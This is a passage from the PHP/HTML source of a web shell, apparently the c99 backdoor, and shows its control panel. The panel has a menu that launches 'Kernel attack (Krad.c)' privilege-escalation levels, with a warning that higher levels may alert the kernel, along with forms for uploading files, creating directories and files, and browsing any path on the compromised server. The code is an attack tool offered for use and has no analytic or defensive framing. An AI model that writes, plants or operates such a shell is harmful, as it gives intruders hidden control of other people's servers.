                    <OPTION VALUE="./k3 3">Kernel attack (Krad.c) PT2 (L3)
                    <OPTION VALUE="./k3 4">Kernel attack (Krad.c) PT2 (L4)
                    <OPTION VALUE="./k3 5">Kernel attack (Krad.c) PT2 (L5)
                  </SELECT>
        <input type=hidden name="cmd_txt" value="1">         
        <input type=submit name=submit value="Execute"> <br><br>
        Warning. Kernel may be alerted using higher levels </div>
    </form>
    </td>
<td width="50%" height="1" valign="top">
 <center><b>:: <a href="ircbot/<?php echo $surl; ?>act=upload&d=<?php echo $ud; ?>"><b>Upload</b></a> ::</b>
 <form method="POST" ENCTYPE="multipart/form-data"><input type=hidden name=act value="upload">
 <input type="file" name="uploadfile"><input type=hidden name="miniform" value="1"> 
 <input type=submit name=submit value="Upload"><br><?php echo $wdt; ?></form></center></td>
</tr>  
<tr><td width="50%" height="1" valign="top"><center><b>:: Make Dir ::</b>
<form action="<?php echo $surl; ?>"><input type=hidden name=act value="mkdir">
<input type=hidden name="d" value="<?php echo $dispd; ?>">
<input type="text" name="mkdir" size="50" value="<?php echo $dispd; ?>"> 
<input type=submit value="Create"><br><?php echo $wdt; ?></form></center></td>
<td width="50%" height="1" valign="top"><center><b>:: Make File ::</b>
<form method="POST"><input type=hidden name=act value="mkfile">
<input type=hidden name="d" value="<?php echo $dispd; ?>">
<input type="text" name="mkfile" size="50" value="<?php echo $dispd; ?>">
<input type=hidden name="ft" value="edit"> 
<input type=submit value="Create"><br><?php echo $wdt; ?></form></center></td></tr>

<tr><td width="50%" height="1" valign="top"><center><b>:: Go Dir ::</b>
<form action="<?php echo $surl; ?>"><input type=hidden name=act value="ls">
<input type="text" name="d" size="50" value="<?php echo $dispd; ?>"> 
<input type=submit value="Go"></form></center></td>
<td width="50%" height="1" valign="top"><center><b>:: Go File ::</b><form action="<?php echo $surl; ?>">
<input type=hidden name=act value="gofile"><input type=hidden name="d" value="<?php echo $dispd; ?>">
<input type="text" name="f" size="50" value="<?php echo $dispd; ?>"> 
<input type=submit value="Go"></form></center></td></tr></table>

</body></html>
<!--- <?php chdir($lastdir); c99shexit(); ?> --/>-
